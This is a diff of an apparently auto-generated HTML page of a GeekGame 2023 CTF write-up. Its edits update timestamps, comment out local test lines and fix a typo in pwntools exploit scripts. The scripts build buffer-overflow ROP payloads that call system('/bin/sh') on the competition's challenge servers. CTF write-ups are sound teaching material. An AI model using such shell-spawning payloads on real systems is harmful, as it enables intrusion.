@@ -45,11 +45,11 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://gwdx.github.io/post/geekgame2023/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2023-10-21T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-10-28T11:15:32+08:00" />
+<meta property="article:modified_time" content="2023-10-28T18:37:29+08:00" />
 <meta itemprop="name" content="GeekGame 2023 题解">
 <meta itemprop="description" content="第三届北京大学信息安全综合能力竞赛（GeekGame）题解"><meta itemprop="datePublished" content="2023-10-21T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2023-10-28T11:15:32+08:00" />
-<meta itemprop="wordCount" content="12022">
+<meta itemprop="dateModified" content="2023-10-28T18:37:29+08:00" />
+<meta itemprop="wordCount" content="12027">
 <meta itemprop="keywords" content="GeekGame,CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="GeekGame 2023 题解"/>
 <meta name="twitter:description" content="第三届北京大学信息安全综合能力竞赛（GeekGame）题解"/>
@@ -298,7 +298,7 @@
 <h2 id="misc">Misc</h2>
 <h3 id="3-z-公司的服务器">3. Z 公司的服务器</h3>
 <h4 id="服务器">服务器</h4>
-<p>直接打开网站链接发现不行，用 <code>nc prob05.geekgame.pku.edu.cn 10005</code> 后提示需要安装 <code>lrzsz</code>，<code>apt</code> 安装后即可接收文件</p>
+<p>直接打开网站链接发现不行，用 <code>nc prob05.geekgame.pku.edu.cn 10005</code> 后 Konsole 提示需要安装 <code>lrzsz</code>，<code>apt</code> 安装后即可接收文件</p>
 <br>
 <h3 id="4-猫咪状态监视器第二阶段">4. 猫咪状态监视器（第二阶段）</h3>
 <p>服务器运行的代码如下。只有 <code>STATUS</code> 可以输入一些内容</p>
@@ -2141,7 +2141,7 @@
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./pwn&#39;)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10009</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
@@ -2447,7 +2447,7 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./pwn&#39;)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10009</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
@@ -2753,7 +2753,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./challenge1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./challenge1&#39;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10010</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
@@ -2768,7 +2768,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">add_rsp_0x88_ret</span> <span class="o">=</span> <span class="mh">0x401365</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">120</span> <span class="o">+</span> <span class="n">main137</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span> <span class="o">*</span> <span class="mi">112</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">add_rsp_0x88_ret</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span> <span class="o">*</span> <span class="mh">0x88</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">system_plt</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">z8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">add_rsp_0x88_ret</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span> <span class="o">*</span> <span class="mh">0x88</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">system_plt</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span>
 </span></span><span class="line"><span class="cl">
@@ -2969,7 +2969,7 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./challenge2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./challenge2&#39;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge2&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10011</span><span class="p">)</span>
@@ -3809,7 +3809,7 @@
     <span class="item-title">LastMod</span>
     <span class="item-content">
         2023-10-28
-        <a href="https://github.com/GWDx/GWDx.github.io/commit/21fd86796296409f6344e356c830c6f7ac3808bd" title="Update geekgame2023.md">(21fd867)</a>
+        <a href="https://github.com/GWDx/GWDx.github.io/commit/a019af3c4b1bb4a10d8f10b79a90f5e75c38f728" title="Update geekgame2023.md">(a019af3)</a>
     </span>
   </p>
   
